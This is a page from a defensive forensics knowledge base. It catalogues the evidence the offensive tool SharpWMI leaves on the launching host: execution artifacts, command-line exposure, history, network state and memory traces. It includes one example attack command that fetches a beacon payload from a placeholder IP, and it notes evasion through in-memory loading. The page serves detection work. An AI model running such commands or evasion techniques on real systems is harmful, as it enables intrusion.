# SharpWMI — Source Evidence

Evidence left on the **attacking/operator** host — wherever `SharpWMI.exe` actually ran, or, for reflective loading, whatever process hosted it. This page has one structural difference from `Impacket/wmiexec/03 - Source Evidence.md`: `wmiexec.py` runs from a Linux (or Windows) box as a Python script with no Windows program-execution telemetry of its own; **SharpWMI is a native Windows PE binary**, so a standalone-binary invocation generates the exact same class of Windows execution evidence (Prefetch, Amcache, ShimCache, Sysmon 1, Security 4688) on the *source* host that `04 - Target Evidence.md` documents for the *target* host of a `Win32_Process.Create()`-based action. Which of those two evidentiary pictures applies depends entirely on delivery method — covered explicitly below rather than assumed.

## Contents
- [Two Delivery Models, Two Different Evidence Pictures](#two-delivery-models-two-different-evidence-pictures)
- [Weaponization and Delivery Artifacts](#weaponization-and-delivery-artifacts)
- [Process and Command-Line Exposure](#process-and-command-line-exposure)
- [Shell / Command History](#shell--command-history)
- [Local Network-Connection State](#local-network-connection-state)
- [Cached Credential Material](#cached-credential-material)
- [OS-Level Audit Trail](#os-level-audit-trail)
- [Memory Forensics](#memory-forensics)
- [Timeline Correlation Value](#timeline-correlation-value)

---

## Two Delivery Models, Two Different Evidence Pictures

| Delivery model | What exists on the source host |
|---|---|
| **Standalone `SharpWMI.exe` on disk**, run directly from an operator-controlled Windows box (a jump box, a compromised workstation being used as a pivot) | Full Windows program-execution trail for the binary itself — Prefetch (`SHARPWMI.EXE-<HASH>.pf`), Amcache, ShimCache, Sysmon Event ID 1 / Security 4688 (if command-line auditing is enabled) capturing the exact `action=`/`command=`/`username=`/`password=` argument string, and a static file (with a hash and, unless scrubbed, PE metadata) sitting somewhere on disk |
| **In-memory reflective load** (`execute-assembly`, `[Assembly]::Load()`) inside an existing beacon/implant process | **No separate `SharpWMI.exe` process ever exists.** No Prefetch entry, no Amcache/ShimCache entry, no distinct file to hash. The only source-host trail is the hosting beacon process's own unbacked CLR module in memory — identical framing to `SharpUp/03 - Source Evidence.md`'s equivalent section, not re-derived in full here |

Everything below applies fully to the standalone-binary model; where the in-memory model changes the picture, it's called out inline.

## Weaponization and Delivery Artifacts

**No official SharpWMI binary exists to fingerprint against.** Per `01 - Overview.md`, the project releases no compiled binaries, ever — every real-world sample is a custom Visual Studio (.NET 3.5) build.

- **PE metadata** is a real lead only if the operator didn't scrub `Properties/AssemblyInfo.cs` before building — unmodified source produces `AssemblyTitle("SharpWMI")`/`AssemblyProduct` strings, editable in seconds, same caveat `SharpUp/03 - Source Evidence.md` and `SharpDump/03 - Source Evidence.md` document for their own builds.
- **Compiled-to-disk EXE**: standard AV/EDR signature scanning applies to whatever specific build landed on disk — per-compile hash only, since source is public and every build is operator-specific.
- **Download artifact, if staged from the internet directly**: a fetched `SharpWMI.exe` or cloned repo carries a `Zone.Identifier` Alternate Data Stream (`ZoneId=3`) if pulled via a browser or `Invoke-WebRequest` without stream suppression — the recurring MOTW pattern documented elsewhere in this repo (`LOLBins/certutil/`, `SharpUp/03 - Source Evidence.md`).
- **Unmanaged/reflective execution** (`execute-assembly`, `[Assembly]::Load()`): the CLR loads into a process that may not normally host .NET at all — an anomaly signal independent of anything SharpWMI-specific, same framing already established for `SharpUp/`/`SharpDump/`.
- **AMSI applicability to SharpWMI's own assembly** depends on the **loader's** hosted CLR version, not SharpWMI's declared .NET 3.5 target (which predates AMSI's CLR-integration hook) — identical caveat to `SharpUp/03 - Source Evidence.md`. Note this is distinct from `amsi=disable`, which targets AMSI **on the remote target**, not on the SharpWMI process itself — see `02 - Hands-On Use Cases.md`.

## Process and Command-Line Exposure

Every SharpWMI invocation is `key=value` arguments on a single process command line — **and unlike `wmiexec.py`'s `user:password@target` positional syntax, SharpWMI's explicit `username=DOMAIN\user` `password=Password123!` arguments are just as fully exposed** in the command line when alternate credentials are used:

```powershell
Get-CimInstance Win32_Process -Filter "Name='SharpWMI.exe'" | Select-Object ProcessId, ParentProcessId, CommandLine
```

If credentials weren't supplied (riding the caller's own token instead), the command line carries no secret at all — just `action=`, `computername=`, and whatever the action-specific arguments are (a `command=` string, a `query=` string, a `script=`/`scriptb64=` VBS payload, etc.). Because every argument is a literal, human-readable `key=value` pair with no obfuscated flag namespace, a captured command line is fully self-explanatory to an analyst who has `01 - Overview.md`'s switches table open — `SharpWMI.exe action=executevbs computername=DC01 url="http://198.51.100.7/beacon.ps1"` states unambiguously both the technique (event-subscription VBS execution) and the payload source.

For the in-memory delivery model, this section's evidence doesn't exist on the source host at all — the beacon/implant process's own command line (or lack thereof, for an interactive C2 session) is what's captured instead, and SharpWMI's own `action=`/`command=` arguments live only in the C2 channel's own logging, not in any Windows-native process-creation event.

## Shell / Command History

- If launched from an interactive PowerShell session, the full invocation — including any inline `username=`/`password=` — lands in `(Get-PSReadlineOption).HistorySavePath` (`ConsoleHost_history.txt`).
- `cmd.exe` carries no persistent cross-session history file by default (`doskey /history` is in-session and process-lifetime-only) — a `cmd.exe`-launched SharpWMI invocation leaves no equivalent artifact unless a separate logging mechanism (PowerShell transcription, a EDR command-line capture) is in place.
- Because SharpWMI's argument set is entirely literal `key=value` text with no positional-credential shorthand to obscure, a recovered PowerShell history entry is a direct, high-fidelity statement of exactly which action and which target the operator was pursuing — comparable to the `SharpUp.exe audit <CheckName>` history-entry finding in `SharpUp/03 - Source Evidence.md`.

## Local Network-Connection State

```powershell
# DCOM/RPC connection to a remote target — present for ANY remote action, absent entirely
# for local-only invocations (computername= omitted)
Get-NetTCPConnection -RemotePort 135 -ErrorAction SilentlyContinue
Get-NetTCPConnection | Where-Object { $_.RemotePort -ge 49152 -and $_.RemotePort -le 65535 }
```

Unlike `wmiexec.py`, SharpWMI has **no separate SMB output-relay connection to track** — `result=true`'s output-capture channel and the `upload` action both ride the same WMI/DCOM connection the rest of the call uses, per `01`'s How It Works. A source-host network view therefore shows exactly one connection class per remote SharpWMI action (DCOM/RPC), never a second SMB leg the way `wmiexec.py`'s default output-enabled mode does.

## Cached Credential Material

- **Explicit `username=`/`password=` arguments**, when used, are visible in cleartext to any local process/user via `Get-CimInstance Win32_Process`/`Get-Process`'s command-line properties for the life of the process — no `/proc/<pid>/cmdline`-style Linux exposure to describe here, but the Windows equivalent (any process able to query another process's command line, which by default includes non-elevated processes owned by the same user, and any elevated/EDR-agent process regardless of owner) is functionally identical.
- If credentials were instead sourced from an environment variable or a wrapping script rather than typed inline, the command line itself carries no secret — but the wrapping script (if left on disk) becomes the artifact to find instead.

## OS-Level Audit Trail

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} | Where-Object { $_.Message -match 'SharpWMI\.exe' }
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} | Where-Object { $_.Message -match '(?i)Image:.*\\SharpWMI\.exe' }
```

If command-line auditing (Security 4688) or Sysmon is deployed **on the operator's own launching host** — realistic if that host is itself a previously-compromised, monitored endpoint rather than infrastructure fully outside defensive visibility — this is the highest-fidelity source-side artifact available, since it captures the full argument string verbatim, is generated at the OS level, and (for Sysmon) survives simple process-list or history-based anti-forensics. Absent either of those, and absent the in-memory delivery model's own evidence, a standalone SharpWMI invocation on an unmonitored operator box produces **no OS-level audit trail at all** by default.

## Memory Forensics

- If the operator box itself is seized/imaged while `SharpWMI.exe` is still running, process memory can contain the plaintext `username=`/`password=` value even in scenarios where a wrapping script or environment-variable sourcing kept it off the visible command line.
- For the reflective-load delivery model, the unbacked CLR module exists only in the hosting beacon process's address space, with no corresponding on-disk PE — the standard unbacked-executable-memory-region signature (Moneta, PE-sieve, EDR memory-scan heuristics) applies, independent of anything SharpWMI-specific, identical framing to `SharpUp/03 - Source Evidence.md`'s and `SharpDump/03 - Source Evidence.md`'s equivalent notes.
- SharpWMI holds any `result=true`-retrieved command output, or any `query=` result set, only transiently in memory before printing to console — there is no output file for either the standalone or reflective-load model, so a live memory capture taken mid-run is the only way to recover retrieved output independent of whatever console-capture the operator's own tooling (C2 log, terminal scrollback) provides.

## Timeline Correlation Value

The source-side artifacts above are, as with `wmiexec.py`, most valuable in **correlation** rather than in isolation: matching a source-host Sysmon 1/Security 4688 event (or, for a monitored jump box, a PowerShell history timestamp) — or, absent both, the DCOM/RPC socket state above — against the target-side evidence chain in `04 - Target Evidence.md` (WMI-Activity 5857, and for `executevbs` specifically, the 5859/5860/5861 triad-registration burst) is what turns "a SharpWMI invocation happened somewhere" into a provable, timestamped link between a specific operator host, a specific action, and a specific target. Because SharpWMI's command line is fully literal and un-obfuscated (per Process and Command-Line Exposure above), a recovered source-side event is unusually information-dense compared to the equivalent artifact for `wmiexec.py`'s positional-credential syntax — it states the exact action, target, and (for `executevbs`) payload-delivery method in one line, without needing a companion check-name table the way `SharpUp`'s command line requires.
